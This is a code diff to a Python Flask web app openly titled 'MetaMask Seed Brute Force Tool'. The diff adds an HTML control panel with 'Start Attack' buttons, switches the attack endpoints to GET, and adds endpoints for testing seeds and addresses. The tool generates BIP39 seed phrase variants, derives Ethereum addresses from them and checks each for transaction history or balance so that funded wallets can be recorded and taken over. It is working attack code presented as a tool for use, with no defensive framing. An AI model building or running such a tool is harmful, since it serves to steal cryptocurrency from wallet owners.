@@ -26,6 +26,79 @@ attack_state = {
 # Global lock for thread-safe operations
 attack_lock = threading.Lock()
 
+@app.route('/', methods=['GET'])
+def homepage():
+    """Homepage with clickable links to all endpoints"""
+    base_url = request.host_url.rstrip('/')
+    return f'''<!DOCTYPE html>
+<html>
+<head>
+    <title>MetaMask Seed Brute Force Tool</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
+        .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+        h1 {{ color: #333; text-align: center; }}
+        .section {{ margin: 30px 0; }}
+        .section h2 {{ color: #666; border-bottom: 2px solid #ddd; padding-bottom: 10px; }}
+        .button {{ display: inline-block; padding: 12px 20px; margin: 8px; background: #007cba; color: white; text-decoration: none; border-radius: 5px; transition: background 0.3s; }}
+        .button:hover {{ background: #005c87; }}
+        .button.status {{ background: #28a745; }}
+        .button.status:hover {{ background: #1e7e34; }}
+        .button.danger {{ background: #dc3545; }}
+        .button.danger:hover {{ background: #c82333; }}
+        .button.test {{ background: #ffc107; color: #212529; }}
+        .button.test:hover {{ background: #e0a800; }}
+        .note {{ background: #e9ecef; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 MetaMask Seed Brute Force Tool</h1>
+        
+        <div class="section">
+            <h2>📊 Status & Monitoring</h2>
+            <a href="{base_url}/health" class="button status">Health Check</a>
+            <a href="{base_url}/attack/status" class="button status">Attack Status</a>
+        </div>
+        
+        <div class="section">
+            <h2>⚔️ Attack Controls</h2>
+            <a href="{base_url}/attack/start?detection_method=transactions" class="button danger">Start Attack (Transaction Method)</a>
+            <a href="{base_url}/attack/start?detection_method=balance" class="button danger">Start Attack (Balance Method)</a>
+            <a href="{base_url}/attack/stop" class="button danger">Stop Attack</a>
+            <div class="note">
+                <strong>Warning:</strong> Attack will run indefinitely until manually stopped. Uses 12 parallel threads for maximum performance.
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>🧪 Testing Tools</h2>
+            <a href="{base_url}/test/seed?seed=abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" class="button test">Test Seed (Example)</a>
+            <a href="{base_url}/test/address?address=0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045" class="button test">Test Address (Vitalik)</a>
+            <div class="note">
+                <strong>Test Endpoints:</strong><br>
+                • <code>/test/seed?seed=YOUR_SEED_PHRASE</code> - Test seed validation and address generation<br>
+                • <code>/test/address?address=YOUR_ADDRESS</code> - Test transaction count and balance checking
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>📝 How It Works</h2>
+            <p>This tool performs brute force attacks on BIP39 seed phrases by:</p>
+            <ol>
+                <li>Generating random 12-word base seeds</li>
+                <li>Testing variations by replacing each word position with all 2048 BIP39 words</li>
+                <li>Validating each generated seed phrase</li>
+                <li>Deriving Ethereum addresses from valid seeds</li>
+                <li>Checking for transaction history or ETH balance</li>
+                <li>Storing successful matches in MongoDB database</li>
+            </ol>
+            <p><strong>Performance:</strong> Uses 12 parallel threads with direct blockchain access (no rate limits)</p>
+        </div>
+    </div>
+</body>
+</html>'''
+
 def process_position_thread(position: int, words: list, seed_gen: SeedGenerator, detection_method: str, 
                           attack_state: dict, original_word: str, results_queue, progress_callback=None):
     """Process a single word position in a separate thread"""
@@ -282,15 +355,14 @@ def health_check():
             "database_connected": False
         })
 
-@app.route('/attack/start', methods=['POST'])
+@app.route('/attack/start', methods=['GET'])
 def start_attack():
     """Start a brute force attack"""
     if attack_state["is_running"]:
         return jsonify({"error": "Attack already running"}), 400
     
-    data = request.get_json() or {}
-    max_attempts_per_cycle = data.get('max_attempts_per_cycle', 2048)
-    detection_method = data.get('detection_method', 'transactions')
+    max_attempts_per_cycle = int(request.args.get('max_attempts_per_cycle', 2048))
+    detection_method = request.args.get('detection_method', 'transactions')
     
     # Start the attack in a background thread
     attack_thread = threading.Thread(
@@ -311,7 +383,7 @@ def start_attack():
         "note": "Attack will run indefinitely until manually stopped via /attack/stop"
     })
 
-@app.route('/attack/stop', methods=['POST'])
+@app.route('/attack/stop', methods=['GET'])
 def stop_attack():
     """Stop the current attack"""
     if not attack_state["is_running"]:
@@ -371,6 +443,108 @@ def compare_methods():
     try:
         seed_gen = SeedGenerator()
         
+        import time
+        
+        # Test transaction count method
+        start_time = time.time()
+        tx_count = seed_gen.get_transaction_count(address)
+        has_transactions = tx_count > 0
+        tx_method_time = time.time() - start_time
+        
+        # Test balance method
+        start_time = time.time()
+        balance = seed_gen.get_balance(address)
+        has_balance = balance > 0
+        balance_method_time = time.time() - start_time
+        
+        return jsonify({
+            "address": address,
+            "transaction_method": {
+                "transaction_count": tx_count,
+                "has_activity": has_transactions,
+                "response_time_ms": round(tx_method_time * 1000, 2),
+                "result": "ACTIVE" if has_transactions else "INACTIVE"
+            },
+            "balance_method": {
+                "balance_eth": balance,
+                "has_balance": has_balance,
+                "response_time_ms": round(balance_method_time * 1000, 2),
+                "result": "HAS_FUNDS" if has_balance else "NO_FUNDS"
+            },
+            "comparison": {
+                "methods_agree": has_transactions == has_balance,
+                "tx_method_faster": tx_method_time < balance_method_time,
+                "speed_difference_ms": round(abs(balance_method_time - tx_method_time) * 1000, 2)
+            }
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/test/seed', methods=['GET'])
+def test_seed():
+    """Test seed phrase validation and address generation"""
+    seed_phrase = request.args.get('seed', '').strip()
+    
+    if not seed_phrase:
+        return jsonify({"error": "Seed phrase required as query parameter (?seed=...)"})
+    
+    try:
+        seed_gen = SeedGenerator()
+        
+        # Test seed validation
+        is_valid = seed_gen.validate_seed(seed_phrase)
+        
+        if not is_valid:
+            return jsonify({
+                "seed_phrase": seed_phrase,
+                "is_valid": False,
+                "error": "Invalid BIP39 seed phrase"
+            })
+        
+        # Generate address from seed
+        try:
+            address = seed_gen.seed_to_address(seed_phrase)
+            
+            # Check transaction count
+            tx_count = seed_gen.get_transaction_count(address)
+            has_transactions = tx_count > 0
+            
+            # Check balance
+            balance = seed_gen.get_balance(address)
+            has_balance = balance > 0
+            
+            return jsonify({
+                "seed_phrase": seed_phrase,
+                "is_valid": True,
+                "generated_address": address,
+                "transaction_count": tx_count,
+                "has_transactions": has_transactions,
+                "balance_eth": balance,
+                "has_balance": has_balance,
+                "activity_status": "ACTIVE" if (has_transactions or has_balance) else "INACTIVE"
+            })
+            
+        except Exception as addr_error:
+            return jsonify({
+                "seed_phrase": seed_phrase,
+                "is_valid": True,
+                "error": f"Failed to generate address: {str(addr_error)}"
+            })
+    
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/test/address', methods=['GET'])
+def test_address():
+    """Test address transaction count and balance checking"""
+    address = request.args.get('address', '').strip()
+    
+    if not address:
+        return jsonify({"error": "Address required as query parameter (?address=...)"})
+    
+    try:
+        seed_gen = SeedGenerator()
         import time
         
         # Test transaction count method
